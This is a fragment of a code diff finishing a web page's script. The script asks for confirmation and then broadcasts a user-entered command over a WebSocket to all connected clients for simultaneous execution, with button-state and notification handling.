+            await new Promise(resolve => setTimeout(resolve, 250));
+
+            const confirmed = await showConfirm(
+                'Broadcast Command',
+                `Send command "${escapeHtml(command)}" to all ${clientCount} connected client(s)?\n\nThis will execute the command simultaneously on all clients.`,
+                'warning'
+            );
+            
+            if (!confirmed) {
+                return;
+            }
+
+            // Disable button during send
+            if (button) {
+                button.disabled = true;
+                button.classList.add('opacity-50');
+            }
+
+            const msg = {
+                type: 'broadcast_command',
+                command: command
+            };
+            ws.send(JSON.stringify(msg));
+            
+            // Re-enable button
+            if (button) {
+                setTimeout(() => {
+                    button.disabled = false;
+                    button.classList.remove('opacity-50');
+                }, 500);
+            }
+            
+            // Show notification
+            showNotification(`Command broadcasted to ${clientCount} client(s)`, 'success');
+        }
+
+        // Allow Enter key to send broadcast command
+        document.addEventListener('DOMContentLoaded', () => {
+        });
+
+        connect();
+    </script>
+</body>
+</html>
